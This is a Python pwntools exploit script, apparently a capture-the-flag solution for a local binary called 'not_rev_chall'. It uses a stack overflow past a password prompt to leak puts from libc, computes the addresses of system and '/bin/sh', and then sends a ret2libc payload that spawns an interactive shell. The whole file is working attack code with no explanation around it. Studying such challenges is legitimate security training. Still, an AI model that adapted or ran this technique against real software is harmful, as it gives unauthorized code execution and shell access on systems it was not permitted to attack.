from pwn import *
elf = ELF("./not_rev_chall")
libc = ELF("/lib/i386-linux-gnu/libc.so.6")
def main():
    r         = elf.process()
    puts_plt  = 0x080483d0
    puts_libc = 0x0804a018
    func_main = 0x0804853f

    p = ''
    p += "A" * 16
    p += '\x00'
    p += "a" * 15
    p += p32(ord('A')) * 16
    p += p32(0) * 16
    p += "A" * 16
    p += p32(puts_plt)
    p += p32(func_main)
    p += p32(puts_libc)

    print "[?] Payload 0x01 : ", p

    r.recvuntil("Password : ")
    r.sendline(p)
    r.recvuntil("Authentication Success\n")
    leak_puts_libc = u32(r.recv(4))
    print "[!] leaking puts@libc : ", hex(leak_puts_libc)


    libc_base = leak_puts_libc - libc.symbols['puts']
    libc_system = libc_base + libc.symbols['system']
    libc_binsh = libc_base + libc.search("/bin/sh").next()


    print "[?] libc_base     : ", hex(libc_base)
    print "[?] libc_system   : ", hex(libc_system)
    print "[?] _libc_bin_sh_ : ", hex(libc_binsh)

    p2 = ""
    p2 += "A" * 16
    p2 += "\x00"
    p2 += "a" * 15
    p2 += p32(ord("A"))*16
    p2 += p32(0) * 16
    p2 += "A" * 16
    p2 += p32(libc_system)
    p2 += "AAAA"
    p2 += p32(libc_binsh)

    print "[?] Payload 0x02 : ", p2

    r.recvuntil("Password : ")
    r.sendline(p2)

    r.interactive()

if __name__ == '__main__':
    main()
